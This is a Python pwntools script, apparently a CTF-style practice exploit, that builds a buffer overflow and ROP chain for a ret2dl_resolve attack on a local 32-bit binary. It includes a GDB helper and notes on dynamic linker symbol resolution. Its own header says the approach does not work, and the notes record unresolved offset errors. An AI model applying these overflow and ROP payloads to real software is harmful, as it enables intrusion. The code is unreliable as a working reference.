
# WON"T WORK, STRTAB is stored in X page of binary
from pwn import *

binary_name = "./tmp/binary1"
libc = ELF("./libc.so.6")

inputs = [b'ex4722', b'What do you mean? African or European swallow?\x00', b'ex4722']
exe = ELF(binary_name)
rop = ROP(binary_name)

gdbscript = r"""
define ld_load
    x/2x $esp
    set $stack = $esp + 4
    set $i =  *((char **) ($stack))
    printf "AT %p is %d\n", $stack, $i
    x/2wx 0x08048320 + $i 
    printf "R_info: %p\n", *( 0x08048320 + $i +4)
    set $rinfo = *(int)( 0x08048320 + $i +4)
    set $rsym = $rinfo >> 8 
    printf "R_sym: %p\n", $rsym 
    set $sym = 0x080481cc + 0x10 * $rsym
    printf "SYM : %p\n", $sym 
    x/6wx $sym
    printf "STR_OFF: %p\n", *$sym 
    set $sym =  *$sym 
    printf "Symbol: %s\n", $sym + 0x0804826c
end
c
"""


def new_processes():
    p = process(binary_name)
    for i in inputs:
        p.send(i)
    return p

def new_debug():
    p = gdb.debug(binary_name,gdbscript=gdbscript)
    for i in inputs:
        p.send(i)
    return p

bof_size = 38

dl_resolve_func = 0x8048380
leave_ret = 0x08048cab
leave_ret = rop.find_gadget(["leave","ret"]).address 
stack_gad = rop.find_gadget(["pop ebx","pop esi", "pop edi", "pop ebp"]).address
ret = rop.find_gadget(["ret"]).address


p = new_debug()
dl_resolve_func = 0x8048380

leave_ret = rop.find_gadget(["leave","ret"]).address 
stack_gad = rop.find_gadget(["pop ebx","pop esi", "pop edi", "pop ebp"]).address
ret = rop.find_gadget(["ret"]).address

dl_resolve_func = 0x8048380
fake_stack = exe.bss() + 0x500 
# table_padding = 12 + 0x10*3
table_padding = 12 
fake_link_map_addr = exe.bss() + 0x200 +8

context.log_level= 'debug'

payload = flat([ 
    b"A"*(bof_size-4),
    fake_stack, # fake ebp
    ret,ret,ret,
    exe.plt.read, 
    leave_ret,
    0, fake_stack, 0x400,
    ])

p.send(payload)

payload = flat([ 
    exe.plt.read, 
    stack_gad,
    0, fake_stack, 0x30,
    fake_stack,
    ])

sleep(.5)
p.clean()
p.send(payload*10)
p.clean()






"""
How to ret 2 dl_resolve:
push val1
dl_runtime_resolve()
val1 + jumprel -(ONE ENTRY???) == Elf32_Rel  *reloc_table
    *reloc_table  = got addr
    *reloc_table +4 = r_info 
        ELF32_R_SYM == r_info >>8 
        ELF32_R_TYPE == r_info & 0xff ( 7 for GOT??)

func's symtab == symtab + ELF32_R_SYM * 0x10

name = STRTAB + func's symtab(First entry)


elf_machine_fixup_plt()
Writes result to got addr specificed


jmp_offset correct 
symtab_offset
strOffset WRONG

Messup upp ofset??
Strtab + 0 for some reason
adds it here _dl_fixup+228

Checking offset 
    _dl_fixup+120
"""
